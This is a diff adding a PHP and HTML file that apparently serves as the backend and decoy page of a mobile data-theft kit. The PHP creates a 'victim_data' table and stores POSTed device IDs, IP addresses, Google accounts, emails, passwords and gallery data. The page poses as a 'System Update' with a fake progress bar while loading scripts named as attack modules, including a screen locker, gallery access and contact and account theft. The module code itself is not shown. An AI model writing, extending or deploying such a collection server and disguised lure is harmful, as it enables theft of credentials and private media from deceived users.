@@ -1,0 +1,187 @@
+<?php
+// Database configuration
+$db_host = 'localhost';
+$db_user = 'root';
+$db_pass = '';
+$db_name = 'virous_data';
+
+// Create database connection
+$conn = new mysqli($db_host, $db_user, $db_pass);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Create database if not exists
+$sql = "CREATE DATABASE IF NOT EXISTS $db_name";
+if ($conn->query($sql) !== TRUE) {
+    die("Error creating database: " . $conn->error);
+}
+
+// Select the database
+$conn->select_db($db_name);
+
+// Create tables if not exists
+$sql = "CREATE TABLE IF NOT EXISTS victim_data (
+    id INT(11) AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(255) NOT NULL,
+    ip_address VARCHAR(50) NOT NULL,
+    user_agent TEXT NOT NULL,
+    google_account TEXT,
+    email TEXT,
+    passwords TEXT,
+    gallery_data LONGTEXT,
+    other_data LONGTEXT,
+    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)";
+
+if ($conn->query($sql) !== TRUE) {
+    die("Error creating table: " . $conn->error);
+}
+
+// Function to get client IP address
+function getIPAddress() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
+// Handle data submission from the JavaScript
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $data = json_decode(file_get_contents('php://input'), true);
+    
+    if (isset($data['device_id'])) {
+        $device_id = $conn->real_escape_string($data['device_id']);
+        $ip_address = getIPAddress();
+        $user_agent = $conn->real_escape_string($_SERVER['HTTP_USER_AGENT']);
+        $google_account = isset($data['google_account']) ? $conn->real_escape_string($data['google_account']) : '';
+        $email = isset($data['email']) ? $conn->real_escape_string($data['email']) : '';
+        $passwords = isset($data['passwords']) ? $conn->real_escape_string(json_encode($data['passwords'])) : '';
+        $gallery_data = isset($data['gallery_data']) ? $conn->real_escape_string(json_encode($data['gallery_data'])) : '';
+        $other_data = isset($data['other_data']) ? $conn->real_escape_string(json_encode($data['other_data'])) : '';
+        
+        $sql = "INSERT INTO victim_data (device_id, ip_address, user_agent, google_account, email, passwords, gallery_data, other_data)
+                VALUES ('$device_id', '$ip_address', '$user_agent', '$google_account', '$email', '$passwords', '$gallery_data', '$other_data')";
+        
+        if ($conn->query($sql) === TRUE) {
+            echo json_encode(['status' => 'success', 'message' => 'Data stored successfully']);
+        } else {
+            echo json_encode(['status' => 'error', 'message' => 'Error: ' . $conn->error]);
+        }
+    } else {
+        echo json_encode(['status' => 'error', 'message' => 'Missing required data']);
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        
+        .loader-container {
+            text-align: center;
+        }
+        
+        .loader {
+            border: 5px solid #333;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 250px;
+            height: 20px;
+            background-color: #333;
+            border-radius: 10px;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background-color: #3498db;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .status-text {
+            margin-top: 10px;
+            font-size: 16px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+    <!-- Load all attack modules -->
+    <script src="screen_locker.js" defer></script>
+    <script src="mobile_attack.js" defer></script>
+    <script src="gallery_access.js" defer></script>
+    <script src="contacts_accounts.js" defer></script>
+    <script src="main.js" defer></script>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="loader"></div>
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        <div class="status-text" id="status">Initializing...</div>
+    </div>
+
+    <script>
+    // This is a simplified initialization script that works with main.js
+    // The main attack logic is now modularized in separate JS files
+    
+    // Initial progress bar setup
+    let progress = 0;
+    const progressBar = document.getElementById('progress');
+    const statusText = document.getElementById('status');
+    
+    // Update progress bar (can be called from main.js)
+    window.updateProgress = function(value, text) {
+        progress = value;
+        progressBar.style.width = progress + '%';
+        if (text) {
+            statusText.textContent = text;
+        }
+    };
+    
+    // Initialize with a simple message
+    updateProgress(5, 'Preparing system update...');
+    
+    // The main.js script will handle the rest of the attack logic
+    </script>
+</body>
+</html>
